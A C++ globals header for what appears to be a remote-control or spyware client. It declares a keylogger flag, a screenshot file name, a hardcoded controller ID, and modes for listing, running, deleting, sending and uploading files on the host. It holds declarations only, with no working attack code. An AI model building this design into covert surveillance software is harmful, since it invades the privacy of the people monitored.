#ifndef GLOBALS_H
#define GLOBALS_H

#include <iostream>

extern const char* scrname;
extern const char* filename;
extern const char* cdfilename;
extern bool isKeyLoggerRunning;
extern bool isConversationRunning;
extern const int64_t sashaId;

enum Modes {
	MODE_STANDARD,
	MODE_CHECK_DIR,
	MODE_FULL_CHECK_DIR,
	MODE_START_FILE,
	MODE_DELETE_FILE,
	MODE_COPY_FILE,
	MODE_SEND_FILE,
	MODE_UPLOAD_FILE,
	MODE_CONVERSATION,
	MODE_PLAY_MUSIC,
};

enum class COE {
	Success,
	EmptyInput,
	EmptyDirectory,
	PathNotFound,
	NotADirectory,
	ConversionError,
	FilesystemError,
	UnexpectedError,
	ExecutionError,
	UnknownError,
	OpenFileError,
	LimitError,
	NotARegularFile,
	RemoveFileError
};

enum class ResponseType {
	Text,
	Path,
	None
};

// If code == Success -> returning target information to handleResult() (text or path to file)
// Else -> returning code + errorDetails to handleResult()
struct Result {
	COE code;						// Function's code of end
	std::string errorDetails;		// Details of error (if there is)
	ResponseType response_type;		// Type of response
	std::string response;			// Target response
};

extern int currentMode;
extern bool isWaitingForFile;
extern bool isMusicPlaying;

#endif